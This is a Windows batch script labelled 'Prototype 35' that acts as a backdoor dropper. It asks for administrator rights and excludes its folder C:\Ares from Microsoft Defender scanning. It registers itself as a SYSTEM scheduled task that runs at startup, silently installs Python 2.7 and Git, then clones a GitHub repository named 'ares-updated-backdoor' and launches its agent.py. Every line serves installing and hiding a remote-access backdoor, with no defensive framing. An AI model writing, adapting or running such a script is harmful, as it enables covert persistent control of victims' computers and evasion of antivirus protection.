@echo on

REM Prototype 35

set "flag=%temp%\admin_ok.txt"
if exist "%flag%" goto RUN

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:RUN
type nul > "%flag%"

mkdir "C:\Ares"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Ares'"
schtasks /create /tn "setup.bat" /tr "\"%~f0\"" /sc onstart /ru SYSTEM /rl highest /f

where python >nul 2>nul
if %errorlevel% neq 0 (
    if not exist "C:\Python27\python.exe" (
        curl -L -o "%TEMP%\python27.msi" "https://www.python.org/ftp/python/2.7.18/python-2.7.18.amd64.msi"
        msiexec /i "%TEMP%\python27.msi" /qn ALLUSERS=1 ADDLOCAL=ALL TARGETDIR=C:\Python27
        setx /M PATH "%PATH%;C:\Python27"
        set "PATH=%PATH%;C:\Python27"
    )
)

where git >nul 2>nul
if %errorlevel% neq 0 (
    curl -L -o "%TEMP%\git_setup.exe" "https://github.com/git-for-windows/git/releases/download/v2.43.0.windows.1/Git-2.43.0-64-bit.exe"
    "%TEMP%\git_setup.exe" /VERYSILENT /NORESTART /NOCANCEL /SP- /CLOSEAPPLICATIONS
    set "PATH=%ProgramFiles%\Git\cmd;%PATH%"
)

git clone "https://github.com/ondrablaha2000-cell/ares-updated-backdoor" "C:\Ares\ares-updated-backdoor"

cd /d "C:\Ares\ares-updated-backdoor"
C:\Python27\python.exe -m ensurepip
C:\Python27\python.exe -m pip install --upgrade pip
C:\Python27\python.exe -m pip install -r requirements.txt

cd /d "C:\Ares\ares-updated-backdoor\agent"
C:\Python27\python.exe agent.py

pause
